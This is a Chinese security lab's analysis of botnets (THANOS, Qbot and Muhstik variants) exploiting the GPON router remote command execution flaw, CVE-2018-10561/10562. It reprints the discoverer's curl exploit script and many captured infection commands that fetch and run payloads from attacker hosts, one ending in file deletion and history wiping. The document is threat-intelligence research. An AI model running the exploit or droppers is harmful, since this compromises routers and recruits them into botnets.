> 原文链接: https://www.anquanke.com//post/id/144673 


# GPON Home Gateway 远程命令执行漏洞被利用情况


                                阅读量   
                                **111420**
                            
                        |
                        
                                                                                    



[![](https://p4.ssl.qhimg.com/t014d36b839977cba0a.jpg)](https://p4.ssl.qhimg.com/t014d36b839977cba0a.jpg)

2018/05/07，ZoomEye Dork(文末有彩蛋)中heige吟诗一首(作者：卞之琳)：<br>
断章<br>
你在桥上看风景，<br>
看风景人在楼上看你。<br>
明月装饰了你的窗子，<br>
你装饰了别人的梦。<br>
殊不知在GPON Home Gateway远程命令执行漏洞被利用的过程中亦是如此。



## 0x00前言

### 一. 漏洞详情

2018/04/30，vpnMentor公布了 GPON 路由器的高危漏洞：验证绕过漏洞(CVE-2018-10561)和命令注入漏洞(CVE-2018-10562)。由于只需要发送一个请求，就可以在 GPON路由器 上执行任意命令，所以在上一篇文章《GPON Home Gateway 远程命令执行漏洞分析》，我们给出了僵尸网络的相关预警。<br>
结合ZoomEye网络空间搜索引擎以及对漏洞原理的详细研究，我们对GPON Home Gateway远程命令执行漏洞被利用情况进行了深入的研究，意外地发现利用该漏洞的僵尸网络是可以被监控的。<br>
短短的四天时间内，这片路由器的战场，竞争、撤退、消亡时时刻刻都在上演，在每一个路由器的背后，每天都有着多个不同的恶意控制者，故事精彩得难以想象。

### 二. 检测原理

漏洞发现者给出的利用脚本如下：

```
#!/bin/bash
echo “[+] Sending the Command… “
# We send the commands with two modes backtick () and semicolon (;) because different models trigger on different devices
curl -k -d “XWebPageName=diag&amp;diag_action=ping&amp;wan_conlist=0&amp;dest_host=$2`;$2&amp;ipv=0” $1/GponForm/diag_Form?images/ 2&gt;/dev/null &gt;/dev/null
echo “[+] Waiting….”
sleep 3
echo “[+] Retrieving the ouput….”
curl -k $1/diag.html?images/ 2&gt;/dev/null | grep ‘diag_result = ‘ | sed -e ‘s/n/n/g’
```

该脚本逻辑如下：

步骤1(行5)：将注入的命令发送至/GponForm/diag_Form并被执行。

步骤2(行9)：利用绕过漏洞访问diag.html页面获取命令执行的结果。

关键点在第二步：

当我们不使用grep diag_result去过滤返回的结果，将会发现部分路由器会将diag_host也一并返回。而参数diag_host就是步骤1中注入的命令。<br>[![](https://p3.ssl.qhimg.com/t01699dc75dedef7391.png)](https://p3.ssl.qhimg.com/t01699dc75dedef7391.png)

这就意味着，通过ZoomEye网络空间搜索引擎，我们可以监控互联网上相关路由器的diag.html页面，从而了解僵尸网络的活动情况。



## 0x01 被利用情况

ZoomEye网络空间搜索引擎在2018/05/05、2018/05/07、2018/05/08进行了三次探测，一共发现了与僵尸网络相关的命令 12处。

### 一. 被利用情况总览

### [![](https://p4.ssl.qhimg.com/t0186101de128b9c6ae.png)](https://p4.ssl.qhimg.com/t0186101de128b9c6ae.png)<br>
二. 详细介绍
<li>Mirai变种僵尸网络 THANOS<br>
这是一个在我们研究前撤退、研究时重新归来的僵尸网络<br>
使用的感染命令如下：<br>
编号1 busybox wget [http://104.243.44.250/mips](http://104.243.44.250/mips) -O /tmp/m<br>
编号10 busybox wget [http://82.202.166.101/mips](http://82.202.166.101/mips) -O –</li>
1.1 104.243.44.250 样本<br>
在我们发现相关攻击痕迹时，样本已无法下载。看起来就像始作俑者已经撤退。<br>[![](https://p3.ssl.qhimg.com/t013f7c7283b3b12387.jpg)](https://p3.ssl.qhimg.com/t013f7c7283b3b12387.jpg)

但是我们仍然从路由器上运行的样本中了解到该僵尸网络的行为：

· 当前进程<br>[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p2.ssl.qhimg.com/t01a57780239fa99aa6.png)

· 网络连接情况<br>[![](https://p0.ssl.qhimg.com/t01db05b44e4ceb2d24.png)](https://p0.ssl.qhimg.com/t01db05b44e4ceb2d24.png)

· CNC<br>
82.202.166.101:45,2018/05/05未连接成功（2018/05/09发现该CNC重新打开）<br>[![](https://p5.ssl.qhimg.com/t011893d1f6edd73b0f.png)](https://p5.ssl.qhimg.com/t011893d1f6edd73b0f.png)

由于该恶意样本拥有生成随机进程名、对外爆破23端口等特征，故可能是Mirai僵尸网络或其变种。

1.2 82.202.166.101 样本



### <a class="reference-link" name="sha256sum%2082.202.166.101/mips"></a>sha256sum 82.202.166.101/mips

94717b25e400e142ce14305bf707dfcfe8327986fa187a2c5b32b028898a39ec 82.202.166.101/mips<br>
2018/05/07，我们发现了少量该样本的感染痕迹，通过进一步研究，我们认为该僵尸网络已经回归。 由于该样本直接在 1.1 中的 CNC 主机上传播，运行时依旧会生成随机进程名，对外爆破23端口，故我们将两者归为同一僵尸网络家族。

新的CNC<br>
185.232.65.169:8080<br>
新的 CNC 上线包如下<br>[![](https://p2.ssl.qhimg.com/t010d4245eb30d2dc64.png)](https://p2.ssl.qhimg.com/t010d4245eb30d2dc64.png)

根据这个上线包，我们将该僵尸网络称为 Mirai变种僵尸网络 THANOS
<li>Q bot僵尸网络变种<br>
这是一个持续存在的僵尸网络，在我们三次探测中均有出现。预计感染了大量设备。<br>
使用的感染命令如下：<br>
编号2 busybox wget [http://185.244.25.162/mips](http://185.244.25.162/mips) -O /tmp/.m<br>
编号7 busybox wget [http://58.215.144.205/mips](http://58.215.144.205/mips) -O /tmp/.q<br>
编号12 busybox wget [http://58.215.144.205/mips](http://58.215.144.205/mips) -O /tmp/adj</li>
2.1 185.244.25.162 样本



### <a class="reference-link" name="sha256sum%20185.244.25.162/mips"></a>sha256sum 185.244.25.162/mips

73473c37e5590bd3eb043e33e2f8832989b88f99449582399522c63d4d46251e 185.244.25.162/mips



### <a class="reference-link" name="file%20185.244.25.162/mips"></a>file 185.244.25.162/mips

185.244.25.162/mips: ELF 32-bit MSB executable, MIPS, MIPS-I version 1 (SYSV), statically linked, stripped<br>
该恶意样本属于 MIPS 架构，使用 UPX 加壳。在脱壳对其进行逆向的过程中，我们意外发现了与该样本相关的源码：[https://darknetleaks.xyz/archive/botnetfiles/Qbot%20Sources/Hacker%20serverside&amp;clientside/client.c](https://darknetleaks.xyz/archive/botnetfiles/Qbot%20Sources/Hacker%20serverside&amp;clientside/client.c)

但该样本和源码依然有很多地方不同：

对外扫描的IP段不同，样本中对外扫描的IP段如下：<br>
该样本在对外扫描时，只会扫描表格中的这些IP<br>[![](https://p2.ssl.qhimg.com/t01ee82805b63826854.png)](https://p2.ssl.qhimg.com/t01ee82805b63826854.png)

· kill别的bot的列表<br>
该样本会检测路由器中已有的进程，如果遇到下列可能属于其它僵尸网络的进程，将会进行 kill 操作(匹配的关键词远比源码中的丰富)<br>[![](https://p5.ssl.qhimg.com/t01cbd8911276481cd8.png)](https://p5.ssl.qhimg.com/t01cbd8911276481cd8.png)

该样本的 CNC 为： 185.33.145.92:252,该 CNC 依旧处于活跃状态<br>[![](https://p4.ssl.qhimg.com/t013fe9c173ed297343.png)](https://p4.ssl.qhimg.com/t013fe9c173ed297343.png)

需要注意的是

该样本内置了 DDoS 攻击模块，可以根据 CNC 指令发动 TCP、UDP、HTTP洪水攻击<br>
该样本内置了 netcore backdoor利用模块，并且可以通过CNC开启对外扫描（默认关闭，相关漏洞详情可以参考链接：[http://blog.knownsec.com/2015/01/a-brief-analysis-of-netcore-netis-leak-emergency/）](http://blog.knownsec.com/2015/01/a-brief-analysis-of-netcore-netis-leak-emergency/%EF%BC%89)

利用脚本如下：<br>
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget [http://185.33.145.92/miggs.sh](http://185.33.145.92/miggs.sh); chmod 777 miggs.sh; sh miggs.sh; tftp 185.33.145.92 -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; tftp -r tftp2.sh -g 185.33.145.92; chmod 777 tftp2.sh; sh tftp2.sh; ftpget -v -u anonymous -p anonymous -P 21 185.33.145.92 ftp1.sh ftp1.sh; sh ftp1.sh; rm -rf miggs.sh tftp1.sh tftp2.sh ftp1.sh; rm -rf *; history -c<br>
2.2 58.215.144.205 样本（2018/05/07 版本）



### <a class="reference-link" name="sha256sum%2058.215.144.205/mips"></a>sha256sum 58.215.144.205/mips

41111f0941b323c13ca84caf1e552dc78caac713f4dc1a03fc322c1febcbd6ba 58.215.144.205/mips<br>
该样本的感染逻辑没有太大变化， CNC 与上文相同，为： 185.33.145.92:252，所以我们认为这与上文同属于 Q bot僵尸网络家族的变种。

2.3 58.215.144.205 样本（2018/05/08 版本）



### <a class="reference-link" name="sha256sum%200508/58.215.144.205/mips"></a>sha256sum 0508/58.215.144.205/mips

9590cc3c1e7a32f6221528b526212b2ad87b793b885639580c276243ec60830b 0508/58.215.144.205/mips<br>
2018/05/08，58.215.144.205/mips更新了相关的样本。通过逆向的结果看，新的样本与之前的逻辑完全不同，恶意控制者更换了控制的程序。

新的样本看起来更像是 Mirai 僵尸网络的新变种，具体的感染细节我们仍在持续跟进中。

该样本的CNC为 linuxusaarm.com:443
<li>Muhstik 僵尸网络<br>
2018/04/20，360netlab曝光了一个长期存在的僵尸网络：Muhstik僵尸网络。在本次漏洞事件中，我们也发现了大量 Muhstik僵尸网络的身影。<br>
该僵尸网络使用的感染命令如下：<br>
编号3 wget -qO – [http://162.243.211.204/gpon|sh](http://162.243.211.204/gpon%7Csh)<br>
编号4 wget -qO – [http://162.243.211.204/aio|sh](http://162.243.211.204/aio%7Csh)<br>
编号5 wget -O /tmp/par [http://162.243.211.204/mrt](http://162.243.211.204/mrt); chmod x /tmp/ping<br>
编号8 wget -qO – [http://54.39.23.28/1sh](http://54.39.23.28/1sh) | sh<br>
编号9 wget -qO – [http://104.54.236.173/gpon](http://104.54.236.173/gpon) | sh</li>
由于该僵尸网络样本众多，多条命令有多次重复感染。故我们通过下图展示各样本和各IP的联系：<br>[![](https://p2.ssl.qhimg.com/t0107eca7f868fc1ae7.png)](https://p2.ssl.qhimg.com/t0107eca7f868fc1ae7.png)

图中红点代表各IP，灰点代表感染的bash脚本，黄点代表各恶意样本，蓝点代表出现的链接，红线代表从bash脚本中下载的样本

各感染脚本如下：



### <a class="reference-link" name="cat%20104.54.236.173/gpon"></a>cat 104.54.236.173/gpon

wget -O /tmp/cron [http://162.243.211.204/cron](http://162.243.211.204/cron); chmod +x /tmp/cron; chmod 700 /tmp/cron; /tmp/cron &amp;<br>
wget -O /tmp/nsshpftp [http://162.243.211.204/nsshpftp](http://162.243.211.204/nsshpftp); chmod +x /tmp/nsshpftp; chmod 700 /tmp/nsshpftp; /tmp/nsshpftp &amp;



### <a class="reference-link" name="cat%20162.243.211.204/gpon"></a>cat 162.243.211.204/gpon

wget -O /tmp/nsshcron [http://162.243.211.204/nsshcron](http://162.243.211.204/nsshcron); chmod +x /tmp/nsshcron; chmod 700 /tmp/nsshcron; /tmp/nsshcron&amp;<br>
wget -O /tmp/nsshpftp [http://162.243.211.204/nsshpftp](http://162.243.211.204/nsshpftp); chmod +x /tmp/nsshpftp; chmod 700 /tmp/nsshpftp; /tmp/nsshpftp &amp;



### <a class="reference-link" name="cat%20162.243.211.204/gpon"></a>cat 162.243.211.204/gpon

wget -O /tmp/nsshcron [http://162.243.211.204/nsshcron](http://162.243.211.204/nsshcron); chmod +x /tmp/nsshcron; chmod 700 /tmp/nsshcron; /tmp/nsshcron&amp;<br>
wget -O /tmp/nsshpftp [http://162.243.211.204/nsshpftp](http://162.243.211.204/nsshpftp); chmod +x /tmp/nsshpftp; chmod 700 /tmp/nsshpftp; /tmp/nsshpftp &amp;root[@vultr](https://github.com/vultr):~/gpon# cat 54.39.23.28/1sh<br>
wget -O /tmp/cron [http://51.254.221.129/c/cron](http://51.254.221.129/c/cron); chmod +x /tmp/cron; chmod 700 /tmp/cron; /tmp/cron &amp;<br>
wget -O /tmp/tfti [http://51.254.221.129/c/tfti](http://51.254.221.129/c/tfti); chmod +x /tmp/tfti; chmod 700 /tmp/tfti; /tmp/tfti &amp;<br>
wget -O /tmp/pftp [http://51.254.221.129/c/pftp](http://51.254.221.129/c/pftp); chmod +x /tmp/pftp; chmod 700 /tmp/pftp; /tmp/pftp &amp;<br>
wget -O /tmp/ntpd [http://51.254.221.129/c/ntpd](http://51.254.221.129/c/ntpd); chmod +x /tmp/ntpd; chmod 700 /tmp/ntpd; /tmp/ntpd &amp;<br>
wget -O /tmp/sshd [http://51.254.221.129/c/sshd](http://51.254.221.129/c/sshd); chmod +x /tmp/sshd; chmod 700 /tmp/sshd; /tmp/sshd &amp;<br>
wget -O /tmp/bash [http://51.254.221.129/c/bash](http://51.254.221.129/c/bash); chmod +x /tmp/bash; chmod 700 /tmp/bash; /tmp/bash &amp;<br>
wget -O /tmp/pty [http://51.254.221.129/c/pty](http://51.254.221.129/c/pty); chmod +x /tmp/pty; chmod 700 /tmp/pty; /tmp/pty &amp;<br>
wget -O /tmp/shy [http://51.254.221.129/c/shy](http://51.254.221.129/c/shy); chmod +x /tmp/shy; chmod 700 /tmp/shy; /tmp/shy &amp;<br>
wget -O /tmp/nsshtfti [http://51.254.221.129/c/nsshtfti](http://51.254.221.129/c/nsshtfti); chmod +x /tmp/nsshtfti; chmod 700 /tmp/nsshtfti; /tmp/nsshtfti &amp;<br>
wget -O /tmp/nsshcron [http://51.254.221.129/c/nsshcron](http://51.254.221.129/c/nsshcron); chmod +x /tmp/nsshcron; chmod 700 /tmp/nsshcron; /tmp/nsshcron &amp;<br>
wget -O /tmp/nsshpftp [http://51.254.221.129/c/nsshpftp](http://51.254.221.129/c/nsshpftp); chmod +x /tmp/nsshpftp; chmod 700 /tmp/nsshpftp; /tmp/nsshpftp &amp;

fetch -o /sbin/kmpathd [http://51.254.221.129/c/fbsd](http://51.254.221.129/c/fbsd); chmod +x /sbin/kmpathd; /sbin/kmpathd &amp;<br>
各样本sha256值如下:<br>
5f2b198701ce619c6af308bcf3cdb2ef36ad2a5a01b9d9b757de1b066070dad7 51.254.221.129/c/bash<br>
f12aa6748543fde5d3b6f882418035634d559fc4ab222d6cfb399fd659b5e34f 51.254.221.129/c/cron<br>
54b951302c8da4f9de837a0309cce034a746345d2f96a821c7fc95aa93752d43 51.254.221.129/c/fbsd<br>
2cfa79ce4059bbc5798f6856cf82af7fce1d161d6ef398c07f01a010ba5299ea 51.254.221.129/c/nsshcron<br>
3ca8c549357d6121b96256715709bccf16a249dcc45bad482f6c8123fc75642f 51.254.221.129/c/nsshpftp<br>
d4fba221b1a706dd3c617e33077d1072b37b2702c3235d342d94abfd032ba5f8 51.254.221.129/c/nsshtfti<br>
e2267edd2b70b5f42a2da942fa47cca98e745f2f2ff8f3bbf7baf8b1331c1a89 51.254.221.129/c/ntpd<br>
cfc82255b7e75da9cd01cffdfd671ccf6fafaa3f705041d383149c1191d8bdff 51.254.221.129/c/pftp<br>
5e8398c89631ea8d9e776ec9bdd6348cb32a77b300ab8b4ead1860a6a1e50be7 51.254.221.129/c/pty<br>
948ef8732346e136320813aade0737540ef498945c1ea14f26a2677e4d64fdee 51.254.221.129/c/shy<br>
5477129edd21ce219e2a8ecf4c0930532c73417702215f5813c437f66c8b0299 51.254.221.129/c/sshd<br>
c937caa3b2e6cbf2cc67d02639751c320c8832047ff3b7ad5783e0fd9c2d7bae 51.254.221.129/c/tfti<br>
3138079caea0baa50978345b58b8d4b05db461b808710146d4e0abb5461c97df 162.243.211.204/aiomips<br>
f12aa6748543fde5d3b6f882418035634d559fc4ab222d6cfb399fd659b5e34f 162.243.211.204/cron<br>
5b71ba608e417fb966ff192578d705a05eab4ff825541d9394c97271196cfd69 162.243.211.204/mrt<br>
CNC<br>
192.99.71.250:9090
<li>未知样本1<br>
该样本使用的感染命令如下：<br>
编号6 curl -fsSL [http://ztccds.freesfocss.com/test.txt](http://ztccds.freesfocss.com/test.txt) | sh</li>


### <a class="reference-link" name="sha256sum%20ztccds.freesfocss.com/zt_arm"></a>sha256sum ztccds.freesfocss.com/zt_arm

24602f1c6d354e3a37d4a2e2dd9cef0098f390e1297c096997cc20da4795f2a2 ztccds.freesfocss.com/zt_arm<br>
该样本会连接 ztccds.freesfocss.com:23364,样本具体功能仍在研究中。
<li>未知样本2<br>
该样本使用的感染命令如下：<br>
编号11 busybox wget [http://185.246.152.173/omni](http://185.246.152.173/omni) -O /tmp/talk<br>
该样本运行的命令为 /tmp/talk gpon</li>


### <a class="reference-link" name="sha256sum%20185.246.152.173/omni"></a>sha256sum 185.246.152.173/omni

18c23bd57c8247db1de2413ce3ff9e61c5504c43cbadaaefce2fb59f4b3c10a0 185.246.152.173/omni<br>
该样本会连接185.246.152.173:1000,但该端口已经关闭(2018/05/09)。

0x02 受影响主机范围

注：由于仅探测了diag.html页面，故在多轮探测中我们只能确定哪些主机被攻击，无法判断攻击者是否攻击成功

一. 探测到的主机均集中在墨西哥<br>
在对探测到的主机进行地域划分时，三轮探测中被攻击的IP都位于墨西哥。<br>
对受影响最多的五个国家进行抽样测试，结果如下：<br>[![](https://p3.ssl.qhimg.com/t0174550f422eb51cb8.png)](https://p3.ssl.qhimg.com/t0174550f422eb51cb8.png)

该漏洞存在与墨西哥和哈萨克斯坦，但是由于固件不同，只有墨西哥的路由器会返回diag_host，所以我们仅监测到墨西哥的路由器受影响情况。<br>[![](https://p3.ssl.qhimg.com/t01d70cd1d201f66450.png)](https://p3.ssl.qhimg.com/t01d70cd1d201f66450.png)

由于墨西哥的设备占据了全球设备的一半以上，我们认为相关数据依旧可以反应僵尸网络的实际情况。

二. 受攻击的路由器执行的命令情况<br>
由于2018/05/05第一轮探测中只统计了存在/tmp字段的diag_host的内容，所以第一轮探测的数据具有一定的局限性。<br>[![](https://p1.ssl.qhimg.com/t01448d1660f0643646.png)](https://p1.ssl.qhimg.com/t01448d1660f0643646.png)

可以很明显看出：

确认被攻击的路由器数量在不断增加<br>
各僵尸网络活动频繁，2018/05/07 Muhstik 僵尸网络发动大量攻击，而2018/05/08就变成了 Q bot僵尸网络变种。僵尸网络之间的竞争可见一斑。



## 0x03 结语

近年来，僵尸网络逐渐盯上攻击简单但危害巨大的物联网漏洞。从去年的GoAhead到今年的GPON事件，无不在提醒我们物联网安全的重要性。能结合ZoomEye网络空间搜索引擎了解到GPON事件背后活跃的僵尸网络动态，对我们来说就是一种收获。<br>
作者：知道创宇404实验室<br>
本文由 Seebug Paper 发布，如需转载请注明来源。本文地址：[https://paper.seebug.org/595/](https://paper.seebug.org/595/)
